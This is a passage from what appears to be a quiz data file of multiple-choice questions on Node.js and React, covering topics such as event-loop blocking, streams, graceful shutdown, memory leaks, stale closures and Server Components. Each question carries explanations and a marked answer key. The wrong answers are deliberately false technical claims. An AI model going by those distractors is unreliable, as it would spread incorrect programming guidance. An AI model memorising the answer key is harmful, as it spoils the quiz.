            answer: "`setTimeout` and `process.nextTick`",
            isCorrect: false,
          },
          {
            answer: "Resolved Promise callbacks and `setTimeout`",
            isCorrect: false,
          },
          {
            answer: "`setTimeout` and `setImmediate`",
            isCorrect: false,
          },
        ],
      },
      {
        question: `Your Node.js API handles CPU-intensive image resizing on uploaded files. Under load, the event loop becomes blocked and all other requests stall. A teammate suggests wrapping the resize function in \`async/await\`. Why does this not solve the problem, and what is the correct approach?`,
        explanation: `**\`async/await\` only helps with I/O-bound work.** When you \`await\` a Promise that wraps a non-blocking I/O operation (a network call, a file read via \`fs.promises\`), the underlying call is handed to the OS, Node.js is free to process other events, and the callback resumes when I/O completes. No CPU is consumed while waiting.

CPU-bound work — tight loops, image processing, cryptography — runs continuously on the main thread and never yields, regardless of whether it's wrapped in a Promise or \`await\`-ed. Adding \`async\` to a synchronous function that burns CPU just wraps its return value in a Promise; it does not make the execution non-blocking.

**The correct solutions:**

1. **\`worker_threads\`** (preferred for CPU-bound tasks within the same process): spawn a \`Worker\` for each image operation. Each worker runs on a separate OS thread with its own V8 isolate, processing images in parallel without blocking the event loop. Data is exchanged via \`postMessage\` / \`SharedArrayBuffer\`.

2. **Child processes** (\`child_process.fork\`): spawn a separate Node.js process. Higher overhead than threads but full isolation — useful for untrusted code or large memory footprints.

3. **Offload to a queue + worker service** (architecturally cleanest at scale): publish resize jobs to a message queue (BullMQ, SQS) and process them in a separate dedicated service.`,
        answers: [
          {
            answer: "`async/await` only yields the event loop during I/O waits — CPU-bound work never yields regardless of how it's wrapped. The correct fix is to offload the image processing to a `worker_threads` Worker, which runs on a separate OS thread.",
            isCorrect: true,
          },
          {
            answer: "Wrapping the resize function in `async/await` schedules it as a microtask, which runs at lower priority than I/O callbacks and prevents event loop starvation.",
            isCorrect: false,
          },
          {
            answer: "Using `setImmediate(() => resizeImage(...))` defers the work to the next event loop iteration, allowing other callbacks to interleave and preventing blocking.",
            isCorrect: false,
          },
          {
            answer: "Node.js automatically moves CPU-intensive Promises to a libuv thread pool (the same pool used for file I/O), so `async/await` is sufficient.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `A Node.js endpoint streams a 2 GB file to an HTTP client. Version A buffers the whole file; version B pipes it. Why does version B use dramatically less memory, and what does \`pipe\` do about a slow client?

\`\`\`javascript
// Version A
app.get("/download", async (req, res) => {
  const data = await fs.promises.readFile("/data/huge.bin");
  res.end(data);
});

// Version B
app.get("/download", (req, res) => {
  fs.createReadStream("/data/huge.bin").pipe(res);
});
\`\`\``,
        explanation: `**Version A** calls \`fs.promises.readFile\`, which reads the *entire* 2 GB into a single \`Buffer\` in memory before sending anything. With even a handful of concurrent downloads the process balloons past its heap/RSS limits and can crash with an out-of-memory error. It also delays the first byte until the whole file is read.

**Version B** uses a **readable stream** piped to the response. The file is read in small chunks (default 64 KB \`highWaterMark\`), each chunk is written to the socket, and then the next chunk is read. Peak memory is a few buffers, not the whole file — roughly constant regardless of file size. Data also starts flowing to the client immediately.

Crucially, \`pipe\` also handles **backpressure** automatically. If the client (or network) is slow, \`res.write()\` returns \`false\` when the socket's internal buffer fills. \`pipe\` responds by calling \`.pause()\` on the read stream, stops pulling from disk, and resumes (\`.resume()\`) only when the \`drain\` event fires. This prevents a fast disk from overwhelming a slow consumer and keeps memory bounded. Manually re-implementing this correctly is error-prone, which is why \`pipe\` (or \`stream.pipeline\`, which also propagates errors and cleans up) is strongly preferred.`,
        answers: [
          {
            answer: "Streaming reads the file in small chunks so peak memory stays roughly constant instead of holding all 2 GB, and `pipe` applies backpressure — pausing the read stream when the client's socket buffer is full and resuming on `drain`.",
            isCorrect: true,
          },
          {
            answer: "`pipe` compresses the file on the fly, so less data is held in memory; slow clients are handled by dropping chunks that can't be sent in time.",
            isCorrect: false,
          },
          {
            answer: "Both versions use the same memory, but `pipe` runs on a libuv worker thread so it doesn't block the event loop; backpressure is irrelevant for HTTP.",
            isCorrect: false,
          },
          {
            answer: "Streaming loads the whole file once too, but caches it on disk; a slow client causes `pipe` to buffer everything in memory until the client catches up.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `What happens when this script runs on Node.js 18 or later with default flags?

\`\`\`javascript
async function loadConfig() {
  throw new Error("missing env var");
}

loadConfig(); // no await, no .catch()

setInterval(() => console.log("still running"), 1000);
\`\`\``,
        explanation: `Calling an \`async\` function that throws returns a **rejected promise**. Nobody awaits it or attaches a \`.catch\`, so once the microtask queue drains, Node emits an \`unhandledRejection\` event.

Since **Node 15**, the default \`--unhandled-rejections\` mode is \`throw\`: if no \`process.on('unhandledRejection')\` handler is registered, the rejection is raised as an uncaught exception. The process prints the stack trace and **exits with code 1**, before the first interval tick, so \`still running\` is never printed.

(Before Node 15 the default only printed a deprecation warning and kept running, which hid many bugs.)

Best practices:
- Always \`await\` or \`.catch()\` promises, and use the \`@typescript-eslint/no-floating-promises\` lint rule
- Treat a global \`unhandledRejection\` handler as a last-resort logger, then exit; don't use it to keep a corrupted process alive`,
        answers: [
          {
            answer: `The process crashes with exit code 1 before "still running" is ever printed. Since Node 15, an unhandled promise rejection is treated like an uncaught exception by default.`,
            isCorrect: true,
          },
          {
            answer: `It prints a warning about the unhandled rejection, then logs "still running" every second forever.`,
            isCorrect: false,
          },
          {
            answer: `Nothing is printed for the error. The rejection is silently swallowed because \`loadConfig\` wasn't awaited, and "still running" is logged every second.`,
            isCorrect: false,
          },
          {
            answer: `The error is retried automatically by the event loop until \`loadConfig\` succeeds.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `A project's \`package.json\` contains \`"type": "module"\`. This file throws at startup. Why, and what is the correct fix?

\`\`\`javascript
// src/render.js
import { readFile } from "node:fs/promises";
import path from "node:path";

const template = await readFile(
  path.join(__dirname, "template.html"),
  "utf8"
);
\`\`\``,
        explanation: `With \`"type": "module"\`, \`.js\` files are loaded as **ES modules**. The CommonJS module wrapper, which injects \`require\`, \`module\`, \`exports\`, \`__filename\`, and \`__dirname\`, isn't used for ESM, so the code throws **\`ReferenceError: __dirname is not defined in ES module scope\`**.

ESM exposes module location through \`import.meta\`:

\`\`\`javascript
// Node 20.11+ / 21.2+
const dir = import.meta.dirname;

// Older versions
import { fileURLToPath } from "node:url";
const dir = path.dirname(fileURLToPath(import.meta.url));
\`\`\`

Top-level \`await\` is not the problem. It's fully supported in ES modules (and *not* supported in CommonJS).`,
        answers: [
          {
            answer: `\`__dirname\` doesn't exist in ES modules. Use \`import.meta.dirname\` (Node 20.11+), or \`path.dirname(fileURLToPath(import.meta.url))\` on older versions.`,
            isCorrect: true,
          },
          {
            answer: `Top-level \`await\` is not allowed in Node.js modules. Wrap the code in an async IIFE.`,
            isCorrect: false,
          },
          {
            answer: `\`node:\` prefixed imports only work in CommonJS. Change them to \`"fs/promises"\` and \`"path"\`.`,
            isCorrect: false,
          },
          {
            answer: `\`__dirname\` must be imported explicitly: \`import { __dirname } from "node:path"\`.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `Your Node.js HTTP API runs as a single process on an 8-core VM. Under load, throughput plateaus while one CPU core sits at 100% and the other seven are idle. Profiling shows the time is spent in your own JavaScript (JSON serialization, validation, templating). What is the most appropriate way to use the remaining cores?`,
        explanation: `Your JavaScript runs on **a single main thread** per Node process. A single process can therefore saturate only about one core with JS work, no matter how many cores the machine has.

The standard fix for request-handling throughput is to **run multiple processes**:
- The built-in **\`node:cluster\`** module forks N workers that share the same listening port, with the primary distributing connections.
- Or a process manager like PM2 in cluster mode.
- Or, in containerized environments, more replicas (pods) behind a load balancer, each with roughly one CPU, which is usually preferred.

Why the other options don't work:
- **\`UV_THREADPOOL_SIZE\`** sizes libuv's thread pool, used for \`fs\`, \`dns.lookup\`, some \`crypto\`, and \`zlib\`. It doesn't parallelize your JavaScript.
- **\`worker_threads\`** suit offloading specific CPU-heavy tasks (as with image processing), not handling every HTTP request. The per-request message passing and serialization overhead would make things worse.
- **\`--max-old-space-size\`** only raises the V8 heap limit.`,
        answers: [
          {
            answer: `Run multiple Node processes, either with \`node:cluster\` (workers share the port) or as multiple replicas behind a load balancer, since each process executes JavaScript on a single main thread.`,
            isCorrect: true,
          },
          {
            answer: `Increase \`UV_THREADPOOL_SIZE\` to 8 so that libuv spreads JavaScript execution across all cores.`,
            isCorrect: false,
          },
          {
            answer: `Spawn a new \`worker_thread\` for every incoming HTTP request so each request runs on its own core.`,
            isCorrect: false,
          },
          {
            answer: `Raise \`--max-old-space-size\`, since a larger heap lets V8 schedule garbage collection and JIT compilation on the idle cores.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `What happens when this code runs?

\`\`\`javascript
const { EventEmitter } = require("node:events");

const bus = new EventEmitter();
bus.on("data", (d) => console.log("got", d));

bus.emit("error", new Error("socket reset"));
console.log("after emit");
\`\`\``,
        explanation: `\`'error'\` is a **special event name** for \`EventEmitter\`. If \`emit('error', err)\` is called and **no listener is registered for \`'error'\`**, Node **throws** \`err\` synchronously from \`emit\`.

Here that means \`after emit\` is never logged, and unless something catches it, the process crashes with an uncaught exception.

This behavior applies to every class built on \`EventEmitter\`: streams, sockets, HTTP requests, child processes, and DB clients. A missing \`'error'\` listener on a stream or socket is a very common cause of production crashes.

Always attach error handlers:

\`\`\`javascript
stream.on("error", (err) => logger.error(err));
// or use stream.pipeline(), which wires up error handling and cleanup for you
\`\`\`

You can also use \`events.errorMonitor\` to observe errors without consuming them.`,
        answers: [
          {
            answer: `\`emit("error")\` with no \`'error'\` listener throws the error. "after emit" is never logged, and the process crashes with an uncaught exception.`,
            isCorrect: true,
          },
          {
            answer: `Nothing happens to the error because there is no \`'error'\` listener. "after emit" is logged.`,
            isCorrect: false,
          },
          {
            answer: `The \`'data'\` listener receives the \`Error\` object, since unhandled events fall back to the first registered listener, and then "after emit" is logged.`,
            isCorrect: false,
          },
          {
            answer: `Node logs a warning to stderr and continues, then logs "after emit".`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `You want every log line written during an HTTP request, including those deep inside service and repository code, to include that request's ID. You don't want to thread a \`requestId\` parameter through every function. Concurrent requests must not see each other's IDs. What's the idiomatic Node.js solution?`,
        explanation: `**\`AsyncLocalStorage\`** (from \`node:async_hooks\`, stable since Node 16) provides a store that follows the **asynchronous execution context**. It propagates through \`await\`, promises, timers, and callbacks, much like thread-local storage in multi-threaded languages.

\`\`\`javascript
import { AsyncLocalStorage } from "node:async_hooks";
export const requestContext = new AsyncLocalStorage();

app.use((req, res, next) => {
  requestContext.run({ requestId: crypto.randomUUID() }, next);
});

// Anywhere downstream:
const id = requestContext.getStore()?.requestId;
\`\`\`

Each \`run()\` creates an isolated context, so concurrent requests interleaved on the event loop each see their own store.

A module-level variable fails because the event loop interleaves requests: request B overwrites the value while request A is still awaiting I/O. \`process.env\` is process-global and string-only. Worker threads don't give per-request isolation for code that runs on the main thread.`,
        answers: [
          {
            answer: `Use \`AsyncLocalStorage\`: wrap each request in \`als.run({ requestId }, next)\` and read \`als.getStore()\` anywhere downstream. The context propagates across \`await\` and callbacks while staying isolated per request.`,
            isCorrect: true,
          },
          {
            answer: `Store the ID in a module-level \`let currentRequestId\` set at the start of each request. Node is single-threaded, so only one request runs at a time.`,
            isCorrect: false,
          },
          {
            answer: `Set \`process.env.REQUEST_ID\` in middleware. Environment variables are scoped to the current async call chain.`,
            isCorrect: false,
          },
          {
            answer: `Run each request in its own \`worker_thread\` and keep the ID in a thread-local global.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `During every Kubernetes rolling deploy, clients see a burst of connection resets and 502s. The service's shutdown code is shown below. What's wrong, and what should the handler do instead?

\`\`\`javascript
const server = app.listen(3000);

process.on("SIGTERM", () => {
  console.log("shutting down");
  process.exit(0);
});
\`\`\``,
        explanation: `When Kubernetes terminates a pod it sends **SIGTERM**, waits up to \`terminationGracePeriodSeconds\` (30s by default), and then sends **SIGKILL**. Calling \`process.exit(0)\` immediately kills the process, aborting every **in-flight request** and dropping open connections, which causes the resets and 502s.

A graceful shutdown should:
1. **Stop accepting new connections** with \`server.close(callback)\`, which waits for in-flight requests to finish. Idle keep-alive sockets can be closed with \`server.closeIdleConnections()\`.
2. Optionally **fail the readiness probe first** and wait a few seconds, so endpoints and load balancers stop routing new traffic to the pod.
3. **Close resources**, such as database pools, message consumers, and Redis clients.
4. **Exit** once done, with a **timeout fallback** shorter than the grace period in case something hangs.

\`\`\`javascript
process.on("SIGTERM", () => {
  const timer = setTimeout(() => process.exit(1), 25_000);
  timer.unref();
  server.close(async () => {
    await db.end();
    process.exit(0);
  });
});
\`\`\`

Also make sure Node actually receives the signal. Run \`node\` directly as PID 1 (exec-form \`CMD\`), not under \`npm start\`.`,
        answers: [
          {
            answer: `\`process.exit(0)\` kills in-flight requests instantly. The handler should call \`server.close()\` to stop accepting connections and let active requests finish, close DB pools and other resources, then exit, with a timeout fallback before Kubernetes sends SIGKILL.`,
            isCorrect: true,
          },
          {
            answer: `The handler should ignore SIGTERM entirely. Kubernetes waits for the process to exit on its own once traffic stops.`,
            isCorrect: false,
          },
          {
            answer: `Listening on SIGTERM is the bug. Node handles SIGTERM gracefully by default, draining connections automatically when no handler is registered.`,
            isCorrect: false,
          },
          {
            answer: `\`process.exit(0)\` should be \`process.exit(1)\`. Kubernetes only reroutes traffic away from pods that exit with a failure code.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `A Node.js service's memory climbs steadily for hours until it's OOM-killed. Which part of this middleware is the most likely cause, and how would you confirm it?

\`\`\`javascript
const inflight = new Map();

app.use((req, res, next) => {
  const id = crypto.randomUUID();
  inflight.set(id, { url: req.url, start: Date.now(), req });

  res.on("finish", () => {
    metrics.observe(Date.now() - inflight.get(id).start);
  });

  next();
});
\`\`\``,
        explanation: `The module-level \`inflight\` Map gets an entry for **every request** and **nothing ever deletes it**. Worse, each entry holds a reference to the full \`req\` object, which keeps its headers, body buffers, socket, and anything attached to it **reachable forever**. Memory grows linearly with traffic.

Fix: \`inflight.delete(id)\` in the \`finish\` (and \`close\`) handlers. Better still, avoid the global map entirely and store the start time on \`res.locals\` or in a closure variable.

To confirm a leak like this:
- Take **heap snapshots** over time and compare them. Use Chrome DevTools via \`node --inspect\`, \`v8.writeHeapSnapshot()\`, or \`--heapsnapshot-signal=SIGUSR2\`.
- In the comparison view, look for object counts that only grow (e.g. \`IncomingMessage\`), and follow the **retainers** path back to the \`Map\`.

Other classic leak sources: unbounded caches without eviction, listeners added per request to long-lived emitters (watch for \`MaxListenersExceededWarning\`), and timers that are never cleared.`,
        answers: [
          {
            answer: `The \`inflight\` Map never removes entries, and each entry retains the entire \`req\` object, so memory grows with every request. Confirm by comparing heap snapshots over time and following the retainers to the Map.`,
            isCorrect: true,
          },
          {
            answer: `\`crypto.randomUUID()\` leaks memory because it allocates from a native entropy pool that V8 can't garbage-collect.`,
            isCorrect: false,
          },
          {
            answer: `\`res.on("finish")\` registers a listener on a global emitter that's never removed, and that alone causes the growth. The Map is harmless.`,
            isCorrect: false,
          },
          {
            answer: `There is no leak. V8 lazily collects old-generation objects, so increase \`--max-old-space-size\` and memory will stabilize.`,
            isCorrect: false,
          },
        ],
      },
    ],
  },
  {
    name: "React",
    questions: [
      {
        question: `A child component is wrapped in \`React.memo\`. Which of the following prop-passing patterns will cause it to **unnecessarily re-render** on every parent render?

\`\`\`tsx
function Parent() {
  const [count, setCount] = React.useState(0);

  // Option A
  const handleA = () => console.log('clicked');

  // Option B
  const handleB = React.useCallback(() => console.log('clicked'), []);

  return (
    <>
      <button onClick={() => setCount(c => c + 1)}>Increment</button>
      <MemoChild onAction={/* handleA or handleB */} />
    </>
  );
}
\`\`\``,
        explanation: `\`React.memo\` performs a **shallow comparison** of props using \`Object.is\`. Functions are objects, and every time \`Parent\` renders, \`handleA\` is recreated as a brand-new function object — a different reference each render. \`Object.is(prevHandleA, nextHandleA)\` is always \`false\`, so \`MemoChild\` re-renders on every parent render despite the memoization wrapper.

\`useCallback\` solves this by returning a **stable reference** across renders as long as its dependency array doesn't change. \`handleB\`'s reference is the same object on every render (since the deps array is empty), so \`MemoChild\`'s prop comparison passes and the re-render is skipped.

The same problem applies to object literals and arrays passed as props — \`const options = { size: 'lg' }\` defined inside a render function creates a new reference every time.`,
        answers: [
          {
            answer: "Passing `handleA` — a callback defined inline without `useCallback`",
            isCorrect: true,
          },
          {
            answer: "Passing `handleB` — a `useCallback`-wrapped callback with an empty dependency array",
            isCorrect: false,
          },
          {
            answer: "Passing a string constant as a prop",
            isCorrect: false,
          },
          {
            answer: "Passing a number derived from `useState`",
            isCorrect: false,
          },
        ],
      },
      {
        question: `The following React component has a subtle bug. What is it, and what is the cleanest fix?

\`\`\`tsx
function Counter() {
  const [count, setCount] = React.useState(0);

  React.useEffect(() => {
    const id = setInterval(() => {
      setCount(count + 1);
    }, 1000);
    return () => clearInterval(id);
  }, []);

  return <div>{count}</div>;
}
\`\`\``,
        explanation: `The \`setInterval\` callback is created **once** (because of the empty dependency array \`[]\`) and **closes over** the value of \`count\` at that moment: \`0\`. Every second it computes \`0 + 1 = 1\` and calls \`setCount(1)\`. After the first tick, \`count\` is already \`1\`, so React bails out of re-rendering (same state value) and the counter is stuck at \`1\` forever. This is the classic **stale closure** bug.

The cleanest fix is the **functional updater form**:
\`\`\`tsx
setCount(c => c + 1);
\`\`\`
The updater receives the *current* state value as its argument at call time, completely bypassing the closed-over stale variable. You could also add \`count\` to the dependency array, but that restarts the interval on every tick — wasteful and potentially jittery. The functional updater solves the problem at the root without any side effects.`,
        answers: [
          {
            answer: "Stale closure: `count` is captured as `0` forever, so the counter gets stuck at `1`. Fix: use the functional updater form `setCount(c => c + 1)`.",
            isCorrect: true,
          },
          {
            answer: "There is no bug — the empty dependency array is correct and `useEffect` re-evaluates closures automatically on each render.",
            isCorrect: false,
          },
          {
            answer: "The `clearInterval` call in the cleanup function stops the interval after the first render, so the counter never increments past `0`.",
            isCorrect: false,
          },
          {
            answer: "The bug is that `useState` is initialized to `0` instead of `null` — numeric initial state causes `setInterval` to behave incorrectly.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `In React, every consumer of this Context re-renders on each keystroke in an unrelated input, causing lag. What is the root cause, and what is a standard fix?

\`\`\`tsx
function AppProvider({ children }: { children: React.ReactNode }) {
  const [user, setUser] = React.useState<User | null>(null);
  const [theme, setTheme] = React.useState<"light" | "dark">("light");

  return (
    <AppContext.Provider value={{ user, setUser, theme, setTheme }}>
      {children}
    </AppContext.Provider>
  );
}
\`\`\``,
        explanation: `Two things combine to cause the problem:

1. **A new \`value\` object every render.** The object literal \`{ user, setUser, theme, setTheme }\` is a fresh reference on every render of \`AppProvider\`. React Context compares the provider's \`value\` by reference (\`Object.is\`); a new object means every consumer is notified of a "change."

2. **All consumers of a single context re-render together.** Context has no partial-subscription mechanism. A component that only reads \`theme\` still re-renders whenever \`user\` (or anything else in the value) changes, because it subscribes to the whole context value.

So when unrelated state elsewhere triggers a provider re-render, the new \`value\` object propagates to *every* consumer.

**Standard fixes:**
- **Split contexts**: put \`user\` and \`theme\` in separate providers so consumers subscribe only to what they use. This is the most idiomatic fix.
- **Memoize the value**: \`const value = useMemo(() => ({ user, setUser, theme, setTheme }), [user, theme])\` gives a stable reference so consumers re-render only when \`user\` or \`theme\` actually change — not on unrelated parent re-renders.
- **Separate state from dispatch**: a common pattern is one context for state and another for the stable \`dispatch\`/setters, so components that only dispatch never re-render on state changes.
- For fine-grained subscriptions at scale, an external store (Zustand, Redux with selectors, or \`useSyncExternalStore\`) lets components subscribe to slices.`,
        answers: [
          {
            answer: "The provider's `value` is a new object literal every render and all consumers of a context re-render together. Fix by splitting into separate contexts and/or memoizing the value with `useMemo` so it changes only when `user`/`theme` actually change.",
            isCorrect: true,
          },
          {
            answer: "Context always re-renders every component in the tree; the only fix is to stop using Context and lift all state into a Redux store.",
            isCorrect: false,
          },
          {
            answer: "The `useState` setters (`setUser`, `setTheme`) are recreated each render, so consumers must wrap them in `useCallback` — that alone eliminates the re-renders.",
            isCorrect: false,
          },
          {
            answer: "React re-renders consumers because the provider is missing a `key` prop; adding a stable `key` to `AppContext.Provider` prevents the cascade.",
            isCorrect: false,
          },
        ],
      },
      {
        question: `A user types a note into the input next to the **first** todo. A new todo is then added to the **top** of the list, and the note now appears next to the *new* todo instead of the original one. What causes this?

\`\`\`tsx
function TodoList({ todos }: { todos: Todo[] }) {
  return (
    <ul>
      {todos.map((todo, i) => (
        <li key={i}>
          {todo.text} <input placeholder="note" />
        </li>
      ))}
    </ul>
  );
}
\`\`\``,
        explanation: `React uses \`key\` to match elements between renders. With \`key={i}\`, the element at index 0 has key \`0\` before *and* after the insertion. React concludes it's **the same component instance**, so it reuses its DOM node and state and only updates the changed text.

The \`<input>\` is **uncontrolled**: its typed value lives in the DOM node, not in React state. The DOM node that held the note stays at position 0 while its text changes to the new todo's. Every item effectively shifts its label relative to its input, and a new \`<li>\` with key \`n\` is appended at the end.

Fix: use a **stable, unique identifier** from the data (\`key={todo.id}\`). Then React sees that a new key appeared at the front and moves the existing nodes intact.

Index keys are only safe when the list is static: never reordered, filtered, or inserted into anywhere but the end.`,
        answers: [
          {
            answer: `Using the array index as the \`key\`. After the insert, index 0 maps to the new todo, so React reuses the first \`<li>\` and its uncontrolled input's DOM state. Use a stable unique ID, like \`todo.id\`, as the key.`,
            isCorrect: true,
          },
          {
            answer: `Uncontrolled inputs always lose their position when a list re-renders. The only fix is to make every input controlled with \`useState\`.`,
            isCorrect: false,
          },
          {
            answer: `\`todos.map\` creates new elements every render, so React remounts the whole list and the browser restores input values by position.`,
            isCorrect: false,
          },
          {
            answer: `The list needs \`React.memo\` on each \`<li>\`. Without it, React reassigns DOM nodes to list items arbitrarily.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `When a user quickly switches from profile A to profile B, the page sometimes ends up showing profile **A** even though \`userId\` is B. What's the bug, and what's the correct fix?

\`\`\`tsx
function Profile({ userId }: { userId: string }) {
  const [user, setUser] = useState<User | null>(null);

  useEffect(() => {
    fetch(\`/api/users/\${userId}\`)
      .then((r) => r.json())
      .then(setUser);
  }, [userId]);

  return user ? <ProfileCard user={user} /> : <Spinner />;
}
\`\`\``,
        explanation: `This is a **race condition**. Changing \`userId\` starts a second request, but the first is still in flight. Network responses can arrive **out of order**: if A's response arrives after B's, \`setUser(A)\` runs last and overwrites the correct data.

The fix is an **effect cleanup function**. React runs it before re-running the effect (and on unmount), so the stale request can be cancelled or ignored:

\`\`\`tsx
useEffect(() => {
  const controller = new AbortController();
  fetch(\`/api/users/\${userId}\`, { signal: controller.signal })
    .then((r) => r.json())
    .then(setUser)
    .catch((e) => { if (e.name !== "AbortError") throw e; });
  return () => controller.abort();
}, [userId]);
\`\`\`

A simpler alternative is a local \`let ignore = false;\` flag that's set to \`true\` in the cleanup and checked before \`setUser\`.

Data-fetching libraries like TanStack Query and SWR handle this for you. That's one reason they're recommended over hand-rolled fetching in effects.`,
        answers: [
          {
            answer: `Responses can arrive out of order, so a stale response for A can overwrite B. Return a cleanup function from the effect that aborts the request (\`AbortController\`) or sets an \`ignore\` flag checked before calling \`setUser\`.`,
            isCorrect: true,
          },
          {
            answer: `The dependency array should be empty (\`[]\`) so the fetch only runs once and can't race.`,
            isCorrect: false,
          },
          {
            answer: `\`setUser\` is asynchronous. Wrap it in \`flushSync\` so the state update applies in the order the requests were sent.`,
            isCorrect: false,
          },
          {
            answer: `\`fetch\` caches responses by URL prefix, so \`/api/users/A\` is served for B. Add \`cache: "no-store"\` to fix it.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `A tooltip component must measure its own rendered size with \`ref.current.getBoundingClientRect()\` and then reposition itself so it doesn't overflow the viewport. With \`useEffect\`, users briefly see the tooltip in the wrong spot before it jumps into place. What's the correct fix?`,
        explanation: `**\`useEffect\`** runs *after* the browser has painted (it's deferred, usually after paint). Measuring and repositioning there means the user sees one frame at the wrong position, then a second frame at the corrected position: a visible flicker.

**\`useLayoutEffect\`** runs **synchronously after React has mutated the DOM but before the browser paints**. If you measure and call \`setState\` there, React re-renders synchronously and the browser paints only the final, correct position.

\`\`\`tsx
useLayoutEffect(() => {
  const rect = ref.current!.getBoundingClientRect();
  setPosition(computePosition(rect, window.innerWidth));
}, [anchor]);
\`\`\`

Trade-offs: it blocks painting, so keep the work small, and it doesn't run during server rendering.

\`useInsertionEffect\` is intended for CSS-in-JS libraries to inject styles. It runs before refs are attached, so it can't measure. \`useMemo\` runs during render, before the DOM exists.`,
        answers: [
          {
            answer: `Do the measurement and position update in \`useLayoutEffect\`. It runs after DOM mutations but before the browser paints, so only the final position is ever shown.`,
            isCorrect: true,
          },
          {
            answer: `Pass an empty dependency array to \`useEffect\`. Effects with \`[]\` run before the first paint.`,
            isCorrect: false,
          },
          {
            answer: `Measure inside \`useMemo\`, which runs after the DOM is committed but before paint.`,
            isCorrect: false,
          },
          {
            answer: `Use \`useInsertionEffect\`, the hook designed for reading layout before paint.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `This component logs the warning *"A component is changing an uncontrolled input to be controlled."* Why?

\`\`\`tsx
function EmailField() {
  const [email, setEmail] = useState<string>();

  return (
    <input
      type="email"
      value={email}
      onChange={(e) => setEmail(e.target.value)}
    />
  );
}
\`\`\``,
        explanation: `React decides whether an input is **controlled** by whether its \`value\` prop is \`undefined\` (or \`null\`):
- \`value={undefined}\` means **uncontrolled**: the DOM owns the value.
- \`value="..."\` (any string) means **controlled**: React owns the value.

\`useState<string>()\` has no initial value, so \`email\` starts as \`undefined\` and the input mounts as uncontrolled. After the first keystroke, \`email\` becomes a string and the input switches to controlled. React warns because switching modes mid-life is almost always a bug and can lose or desync the value.

Fix: initialize with an empty string, \`useState("")\`, so the input is controlled from the first render.

For the opposite case, an input you deliberately leave uncontrolled, use \`defaultValue\` and read the value via a ref or \`FormData\` on submit.`,
        answers: [
          {
            answer: `\`email\` starts as \`undefined\`, so the input mounts uncontrolled and becomes controlled once the user types. Initialize state with \`useState("")\`.`,
            isCorrect: true,
          },
          {
            answer: `Inputs with \`type="email"\` must be uncontrolled. Remove the \`value\` prop and use \`defaultValue\`.`,
            isCorrect: false,
          },
          {
            answer: `\`onChange\` should be \`onInput\`. React only treats an input as controlled when \`onInput\` is used.`,
            isCorrect: false,
          },
          {
            answer: `\`setEmail\` must be wrapped in \`useCallback\`, or React treats each render's input as a new uncontrolled element.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `In a Next.js App Router project, this file fails with an error about \`useState\`. What's the correct way to restructure it?

\`\`\`tsx
// app/products/page.tsx  (no directive at the top of the file)
import { useState } from "react";

export default async function ProductsPage() {
  const products = await db.product.findMany();
  const [filter, setFilter] = useState("");

  return (
    <>
      <input value={filter} onChange={(e) => setFilter(e.target.value)} />
      <ProductGrid products={products.filter((p) => p.name.includes(filter))} />
    </>
  );
}
\`\`\``,
        explanation: `Files in the App Router are **React Server Components (RSC)** by default. Server Components:
- run **only on the server** (at request or build time) and send rendered output to the client
- **can** be \`async\` and access databases, the file system, and secrets directly
- **cannot** use state or effects (\`useState\`, \`useEffect\`, etc.), browser APIs, or event handlers like \`onChange\`, because they never hydrate or re-render in the browser

The idiomatic structure keeps data fetching on the server and pushes interactivity down into a **Client Component**:

\`\`\`tsx
// app/products/page.tsx (Server Component)
export default async function ProductsPage() {
  const products = await db.product.findMany();
  return <ProductFilter products={products} />;
}

// app/products/ProductFilter.tsx
"use client";
export function ProductFilter({ products }: { products: Product[] }) {
  const [filter, setFilter] = useState("");
  // ...
}
\`\`\`

Props passed from a Server Component to a Client Component must be **serializable**: no functions (other than Server Actions), and no class instances.`,
        answers: [
          {
            answer: `It's a Server Component, which can be \`async\` and query the DB but can't use state or event handlers. Keep the data fetching in the page and move the filter input and state into a separate \`"use client"\` component that receives \`products\` as props.`,
            isCorrect: true,
          },
          {
            answer: `Add \`"use client"\` to the page and keep everything as is. Client Components can be \`async\` and query the database directly.`,
            isCorrect: false,
          },
          {
            answer: `Replace \`useState\` with \`useRef\`. Refs are allowed in Server Components because they don't trigger re-renders.`,
            isCorrect: false,
          },
          {
            answer: `Move \`useState\` above the \`await\`. Hooks are allowed in async Server Components as long as they're called before the first \`await\`.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `Using React 18+ with \`createRoot\` (and ignoring Strict Mode's double rendering), how many times does \`Counter\` re-render after one click?

\`\`\`tsx
function Counter() {
  const [a, setA] = useState(0);
  const [b, setB] = useState(0);
  console.log("render", a, b);

  const onClick = () => {
    setTimeout(() => {
      setA((x) => x + 1);
      setB((x) => x + 1);
    }, 0);
  };

  return <button onClick={onClick}>{a + b}</button>;
}
\`\`\``,
        explanation: `React 18 introduced **automatic batching** for all updates when using \`createRoot\`. Multiple state updates in the same tick are grouped into **a single re-render**, whether they happen in event handlers, \`setTimeout\`, promises, native event listeners, or anywhere else.

So after the click, the two updates inside the timeout produce **one** render that logs \`render 1 1\`.

In **React 17 and earlier** (or with the legacy \`ReactDOM.render\`), batching only happened inside React event handlers. Updates in \`setTimeout\`/promises each triggered their own render, so this would have rendered **twice**, including an intermediate \`render 1 0\` state.

If you need a synchronous render between updates (rare, e.g. to read layout immediately), opt out with \`flushSync\` from \`react-dom\`.`,
        answers: [
          {
            answer: `Once. React 18's automatic batching groups both updates into a single render, even inside \`setTimeout\`.`,
            isCorrect: true,
          },
          {
            answer: `Twice. Batching only applies to updates made directly inside React event handlers, not inside timeouts.`,
            isCorrect: false,
          },
          {
            answer: `Three times: once for the click event and once for each state update.`,
            isCorrect: false,
          },
          {
            answer: `Zero times. State updates inside \`setTimeout\` are ignored unless wrapped in \`startTransition\`.`,
            isCorrect: false,
          },
        ],
      },
      {
        question: `What's the main problem with this component, and what's the idiomatic fix?

\`\`\`tsx
